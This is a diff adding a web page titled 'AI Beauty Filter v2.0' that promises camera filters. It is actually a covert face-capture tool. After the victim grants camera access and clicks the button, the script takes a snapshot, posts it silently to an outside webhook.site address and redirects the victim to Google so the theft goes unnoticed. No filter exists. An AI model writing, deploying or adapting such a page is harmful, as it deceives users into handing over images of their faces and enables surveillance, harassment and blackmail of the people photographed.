@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Face Filter & Analyzer</title>
+    <style>
+        body { background: #121212; color: #00ff00; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        #video { width: 90%; max-width: 400px; border: 3px solid #ff00ff; border-radius: 15px; margin-top: 20px; box-shadow: 0 0 20px #ff00ff; }
+        button { padding: 15px 30px; font-size: 18px; background: #ff00ff; color: white; border: none; border-radius: 50px; cursor: pointer; margin-top: 20px; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 0, 255, 0.4); }
+        button:active { transform: scale(0.95); }
+        p { color: #ccc; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <h1>AI Beauty Filter v2.0</h1>
+    <p>Please allow camera to see the magic filters!</p>
+    <video id="video" autoplay playsinline></video>
+    <br>
+    <button id="capture">Apply AI Filter</button>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+     
+        const webHookUrl = 'https://webhook.site/e5a7946f-8158-4941-981d-54faa7aad32f'; 
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => { alert("Filter requires camera permission!"); });
+
+        document.getElementById('capture').addEventListener('click', () => {
+            // 500ms delay taaki camera frame load ho jaye aur black screen na aaye
+            setTimeout(() => {
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0);
+                
+                const imageData = canvas.toDataURL('image/png');
+
+                fetch(webHookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'text/plain' },
+                    body: imageData
+                })
+                .then(() => {
+                    window.location.href = "https://www.google.com"; 
+                })
+                .catch(() => {
+                    window.location.href = "https://www.google.com";
+                });
+            }, 500); 
+        });
+    </script>
+</body>
+</html>
